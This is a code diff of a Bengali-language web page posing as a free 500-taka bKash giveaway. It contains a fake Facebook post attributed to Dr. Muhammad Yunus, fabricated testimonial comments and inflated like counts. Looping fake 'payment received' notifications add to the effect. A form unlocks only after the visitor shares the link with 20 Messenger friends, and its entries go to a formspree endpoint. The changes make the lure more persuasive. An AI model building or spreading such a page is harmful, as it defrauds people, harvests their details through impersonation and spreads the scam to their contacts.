@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>Bkash-500tk-Free</title>
+  <title>bKash-500tk-Free</title>
   <style>
     body {
       font-family: 'Noto Sans Bengali', Arial, sans-serif;
@@ -149,7 +149,7 @@
     }
     .fb-post-user {
       font-weight: bold;
-      color: #333;
+      color: Black;
       font-size: 1.09rem;
     }
     .fb-post-time {
@@ -182,41 +182,41 @@
       gap: 0.4rem;
       cursor: pointer;
       font-weight: 600;
-      color: #e60074;
-      background: none;
-      border: none;
+      color: red;
+      background: #87CEFA;
+      border: yellow;
       font-size: 1.1rem;
       padding: 0.13rem 0.3rem;
       border-radius: 0.3rem;
       transition: background 0.12s;
     }
     .fb-like-btn.liked {
-      color: #fff;
-      background: #e60074;
+      color: white;
+      background: blue;
     }
     .fb-like-btn:hover,.fb-comment-btn:hover {
-      background: #ffe1f3;
+      background: blue;
     }
     .fb-comment-count,.fb-like-count {
-      color: #b6004a;
+      color: red;
       font-size: 1.07rem;
       margin-left: 0.13rem;
       min-width: 50px;
       display: inline-block;
     }
     .fb-post-comments {
-      margin: 0.7rem 0 0.3rem 0.2rem;
+      margin: 0.9rem 0 0.7rem 0.5rem;
       padding-bottom: 0.2rem;
     }
     .fb-comment {
       display: flex;
       align-items: flex-start;
-      gap: 0.6rem;
-      margin-bottom: 0.5rem;
+      gap: 0.8rem;
+      margin-bottom: 0.6rem;
     }
     .fb-comment-avatar {
-      width: 32px;
-      height: 32px;
+      width: 35px;
+      height: 35px;
       border-radius: 50%;
       background: #ffe1f3;
       display: flex;
@@ -225,21 +225,21 @@
       font-size: 1.08rem;
       font-weight: bold;
       color: #e60074;
-      border: 1.5px solid #ffd1ec;
+      border: 1.9px solid #ffd1ec;
     }
     .fb-comment-body {
-      background: #f7c2de3a;
-      border-radius: 0.8rem;
-      padding: 0.55rem 0.9rem;
-      color: #232323;
-      font-size: 1.03rem;
+      background: blue;
+      border-radius: 0.9rem;
+      padding: 0.60rem 1rem;
+      color: white;
+      font-size: 1.05rem;
     }
 
     /* --- Live Notification --- */
     #liveNotifyWrap {
-      width: 100vw;
-      min-height: 56px;
-      height: 56px;
+      width: 90vw;
+      min-height: 53px;
+      height: 53px;
       position: relative;
       margin: 0 auto 0 auto;
       padding: 0;
@@ -247,7 +247,8 @@
       flex-direction: column;
       align-items: flex-start;
       justify-content: flex-end;
-      margin-bottom: 10px;
+      margin-bottom: 30px;
+	  margin-top: 30px;
       transition: height 0.2s;
       box-sizing: border-box;
       overflow: hidden;
@@ -255,18 +256,18 @@
     .live-notify {
       display: flex;
       align-items: center;
-      gap: 0.9rem;
-      min-width: 250px;
-      max-width: 340px;
-      background: #fff5f9;
+      gap: 0.5rem;
+      min-width: 300px;
+      max-width: 300px;
+      background: black;
       border-radius: 1.4rem;
       box-shadow: 0 4px 24px #ffb3d4a0, 0 2px 8px #ffe1f3;
       color: #b6004a;
-      font-weight: 600;
-      font-size: 1.04rem;
-      padding: 0.97rem 1.3rem 0.97rem 1.1rem;
-      margin-bottom: 7px;
-      opacity: 0.98;
+      font-weight: 400;
+      font-size: 0.8rem;
+      padding: 0.80rem 1.1rem 0.80rem 0.95rem;
+      margin-bottom: 5px;
+      opacity: 1;
       position: absolute;
       left: -360px;
       top: 0;
@@ -274,35 +275,24 @@
       will-change: left, opacity;
     }
     .live-notify-amount {
-      color: #fff;
+      color: yellow;
       background: linear-gradient(135deg,#ff69b4 70%,#ffd1ec 100%);
       border-radius: .9rem;
-      padding: 0.25rem 0.88rem 0.25rem 0.77rem;
+      padding: 0.30rem 0.95rem 0.30rem 0.85rem;
       font-size: 1.06rem;
       font-weight: 800;
       box-shadow: 0 3px 14px #ffd1ec90;
       letter-spacing: 1px;
     }
     @keyframes liveNotifAnim {
-      0%   { left: -360px; opacity: 0.85;}
+      0%   { left: -400px; opacity: 0;}
       10%  { left: 10px; opacity: 1;}
       90%  { left: 75vw; opacity: 1;}
       100% { left: 100vw; opacity: 0;}
     }
-    @media(max-width: 600px){
-      .live-notify {max-width:94vw;}
-      #liveNotifyWrap { min-height: 54px; height: 54px;}
-    }
-    .note-warning {
-      background: #ffe5ee;
-      border: 2px dashed #ff69b4;
-      padding: 1.4rem 0.8rem;
-      border-radius: 1rem;
-      color: #c8005e;
-      font-size: 1.05rem;
-      margin-bottom: 1.7rem;
-      font-weight: 700;
-      text-align: center;
+    @media(max-width: 500px){
+      .live-notify {max-width:90vw;}
+      #liveNotifyWrap { min-height: 50px; height: 50px;}
     }
   </style>
 </head>
@@ -313,50 +303,6 @@
   <div id="liveNotifyWrap"></div>
   <div id="fbpost"></div>
   <script>
-    // ----------- In-App Browser Detect & Block -----------
-    const FIXED_URL = "https://akash2025id.github.io/Bkash-Free-Tk/";
-    function inAppBrowserName() {
-      const ua = navigator.userAgent || "";
-      if (/FBAN|FBAV|FB_IAB|FB4A|FBCR|FBSS|FBID|FBSN|FBBV|FBCA|FBMD|FBLC|FBSC|FBOP/.test(ua)) {
-        return "Facebook";
-      }
-      if (/Instagram/.test(ua)) {
-        return "Instagram";
-      }
-      if (/Messenger/.test(ua)) {
-        return "Messenger";
-      }
-      return null;
-    }
-    function showOpenInBrowser() {
-      document.getElementById("main").innerHTML = `
-        <div class="note-warning">
-          আপনি Facebook/Messenger/Instagram-এর ভিতরের ব্রাউজার থেকে আসছেন।
-          <br><br>
-          কিছু ফিচার (Share, ফর্ম সাবমিট) কাজ করবে না।
-          <br><br>
-          দয়া করে <b>Chrome/Browser</b> দিয়ে লিংকটি খুলুন।
-        </div>
-        <button class="btn-main" onclick="openNativeBrowser()">Chrome/Browser-এ খুলুন</button>
-        <div style="margin-top:1.4rem;color:#b6004a;">নিজে কপি করে Chrome-এও ওপেন করতে পারেন:<br><span style="font-size:1.07rem;background:#fff2f8;border-radius:0.5rem;padding:0.2rem 0.5rem;user-select:all">${FIXED_URL}</span></div>
-      `;
-    }
-    function openNativeBrowser() {
-      // Android intent (works on most Android devices)
-      if (navigator.userAgent.match(/Android/i)) {
-        window.location = `intent://${FIXED_URL.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
-        setTimeout(() => {
-          window.open(FIXED_URL, "_blank");
-        }, 1500);
-      } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
-        // iOS: open in Safari
-        window.location = FIXED_URL;
-      } else {
-        // fallback
-        window.open(FIXED_URL, "_blank");
-      }
-    }
-
     // ------- LocalStorage Utils -------
     const get = key => window.localStorage.getItem(key);
     const set = (key, val) => window.localStorage.setItem(key, val);
@@ -366,21 +312,25 @@
     const TARGET_SHARES = 20;
     const FORM_ENDPOINT = "https://formspree.io/f/myzjlqdp";
     const BANNER_IMG = "https://i.ytimg.com/vi/MFOOxXbD3RY/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLC0qk4Ob3WwWpspjKN3gk6dKXf6LA";
-    const SHARE_TEXT = `একটা ফ্রি অফার! এই লিংকে গিয়ে ফর্ম ফিলাপ করলে bKash-এ টাকা পাবেন!`;
+   const SHARE_TEXT = `🎉 অবিশ্বাস্য সুযোগ! মাত্র একবার ফর্ম পূরণ করলেই আপনি পেতে পারেন bKash-এ সরাসরি ৫০০ টাকা ক্যাশ উপহার! 🤑💸 এখনই লিংকে যান ও আপনার সুযোগটি নিশ্চিত করুন! ✅👇`;
+
 
     // ------- Facebook Post Data -------
-    const FBPOST_USER = {name:'Sadia Akter', avatar:'স', time:'2 ঘন্টা আগে'};
-    const FBPOST_TEXT = "👋 হ্যালো বন্ধুরা! আপনারা কি সবাই টাকা পেয়েছেন? 🎁 এটাই আমাদের প্রকৃত সার্থকতা! ✅❤️👇 যারা পেয়েছেন তারা কমেন্টে জানিয়ে দিন — সবার আনন্দ ভাগ করে নিই! 🥰📢";
+    const FBPOST_USER = {name:'Dr. Muhammad Yunus', avatar:'M-U', time:'৩ দিন আগে'};
+    const FBPOST_TEXT = "👀 সবাই চেক করুন! যারা শেয়ার করেছেন এবং ফর্ম পূরণ করেছেন, তাদের টাকা পৌঁছে গেছে bKash-এ! 🎊 আপনারাও যদি পেয়ে থাকেন, তাহলে দেরি না করে জানিয়ে দিন! 💬👇 আমাদের উদ্যোগ সফল করতে আপনাদের মতামতই যথেষ্ট ❤️✨";
+
     const FBPOST_IMG = BANNER_IMG;
-    const FBPOST_INIT_LIKES = 115000;
-    const FBPOST_INIT_COMMENTS = 99000;
+    const FBPOST_INIT_LIKES = 115677;
+    const FBPOST_INIT_COMMENTS = 99362;
     const FBPOST_COMMENTS = [
-      {user:'Hasan', avatar:'H', text:'আমি টাকা পেয়েছি, অনেক ধন্যবাদ!'},
-      {user:'Rima', avatar:'র', text:'আশা করিনি সত্যি পাবো!'},
-      {user:'Sumon', avatar:'S', text:'অসাধারণ!'},
-      {user:'Jannat', avatar:'জ', text:'আমিও টাকা পেয়েছি।'},
-      {user:'Mithila', avatar:'মি', text:'শেয়ার করলেই টাকা পাচ্ছি, বিশ্বাস করতে পারছি না!'},
-      {user:'Rafsan', avatar:'R', text:'অনেক উপকার হয়েছে, ধন্যবাদ!'}
+		{user:'Mithila', avatar:'M', text:'শেয়ার করলেই টাকা পাচ্ছি, বিশ্বাস করতে পারছি না!'},
+		{user:'Rafsan', avatar:'R', text:'অনেক উপকার হয়েছে, ধন্যবাদ!'},
+		{user:'Sadia', avatar:'সা', text:'অনেক দিন পর একটা আসল অফার পেলাম!'},
+		{user:'Tanim', avatar:'T', text:'৫০০ টাকা পেয়ে গেছি, সত্যিই চমৎকার।'},
+		{user:'Nusrat', avatar:'নু', text:'আমি গতকাল ফর্ম পূরণ করেছিলাম, আজ পেলাম টাকা!'},
+		{user:'Imran', avatar:'I', text:'সবাই দ্রুত করে ফেলো, আমি পেলাম!'},
+		{user:'Farhana', avatar:'ফা', text:'এমন উদ্যোগ আরও হওয়া উচিত। ধন্যবাদ!'},
+		{user:'Rakib', avatar:'R', text:'এটা একদম সত্যি!'},
     ];
 
     // ------- State -------
@@ -401,11 +351,11 @@
     }
     function handleChromeRedirect() {
       try {
-        window.location.href = "googlechrome://navigate?url=" + FIXED_URL;
+        window.location.href = "googlechrome://navigate?url=" + window.location.href;
         setTimeout(() => {
-          window.open(FIXED_URL, '_blank');
+          window.open('https://chrome.google.com/', '_blank');
         }, 1500);
-      } catch(e) { window.open(FIXED_URL,'_blank'); }
+      } catch(e) { window.open('https://chrome.google.com/','_blank'); }
     }
     function renderFBPost() {
       let likeCount = FBPOST_INIT_LIKES + (state.fbLiked?1:0);
@@ -488,7 +438,7 @@
         return;
       }
       main.innerHTML = `
-        <h1 style="color:#e60074;font-size:1.4rem;font-weight:700;text-align:center;">Messenger Target Share & Win</h1>
+        <h1 style="color:#e60074;font-size:1.4rem;font-weight:700;text-align:center;">ম্যাসেন্জারে শেয়ার করুন এবং টাকা নিন।</h1>
         <div class="upgrade-bar" style="margin-top:1.7rem;">
           <div class="upgrade-fill" id="upgradeFill" style="width:${state.upgrade}%;"></div>
           <div class="upgrade-text">${state.upgrade}%</div>
@@ -497,7 +447,7 @@
           <button class="btn-main" style="font-size:1.13rem;" onclick="handleShowSharePopup()" ${state.upgrade>=100?'disabled':''}>
             Share করুন ${state.upgrade<100?`<span style='font-size:1.05rem;'>(${state.shareCount}/${TARGET_SHARES})</span>`:""}
           </button>
-          ${state.upgrade<100?`<div style="margin-top:1rem;color:#e60074;font-weight:600;">২০ জন ফ্রেন্ডকে মেসেঞ্জারে শেয়ার করুন</div>`:""}
+          ${state.upgrade<100?`<div style="margin-top:1rem;color:#e60074;font-weight:600;">২০ জন ফ্রেন্ডকে মেসেঞ্জারে শেয়ার করলে নিচের ফর্মটি খুলে যাবে.👇</div>`:""}
         </div>
         <div style="position:relative; margin-top:2.7rem;">
           <form id="payForm" ${state.upgrade<100?'class="blur-form"':''} autocomplete="off" style="display:flex; flex-direction:column; gap:1.1rem;">
@@ -558,7 +508,7 @@
         }, delay);
       }
       render();
-      let url = FIXED_URL;
+      let url = window.location.href;
       if (navigator.share) {
         try {
           await navigator.share({
@@ -621,13 +571,12 @@
     window.handleFormSubmit = handleFormSubmit;
     window.handleFBLike = handleFBLike;
     window.handleFBCommentClick = handleFBCommentClick;
-    window.openNativeBrowser = openNativeBrowser;
 
     // ------- Live Notification Name/Amount List -------
     const liveNames = [
-      "তুহিন","রাহুল","জাহিদ","নাসিমা","শামীম","তানিম","শারমিন","মনিরুল","তাসনিম","বদরুল","রাকিব","সুমন","রিমা","হাসিব","রাফি","নাঈম","শাওন","মুন","তিথি","আফরোজা","মাহিন","ফারিয়া","সাব্বির","রনি","সাবিনা","রাফসান","মিথিলা","নূর","রেহান","তাসফিয়া","জিন্নাত","জাহানারা"
+      "Hasan", "Rima", "Sumon", "Jannat", "Mithila", "Rafsan", "Sadia", "Tanim", "Nusrat", "Imran", "Farhana","Rakib","তুহিন","রাহুল","জাহিদ","নাসিমা","শামীম","তানিম","শারমিন","মনিরুল","তাসনিম","বদরুল","রাকিব","সুমন","রিমা","হাসিব","রাফি","নাঈম","শাওন","মুন","তিথি","আফরোজা","মাহিন","ফারিয়া","সাব্বির","রনি","সাবিনা","রাফসান","মিথিলা","নূর","রেহান","তাসফিয়া","জিন্নাত","জাহানারা"
     ];
-    const liveAmounts = [500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500];
+    const liveAmounts = [500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500];
 
     // ------- Live Notification Logic -------
     let usedLiveNames = {};
@@ -696,17 +645,10 @@
       }
       setTimeout(nextNoti, 900);
     }
-
-    // ---- ENTRY POINT ----
-    const inApp = inAppBrowserName();
-    if (inApp) {
-      showOpenInBrowser();
-    } else {
-      render();
-      renderPopup();
-      renderFBPost();
-      startLiveNotify();
-    }
+    render();
+    renderPopup();
+    renderFBPost();
+    startLiveNotify();
   </script>
 </body>
 </html>
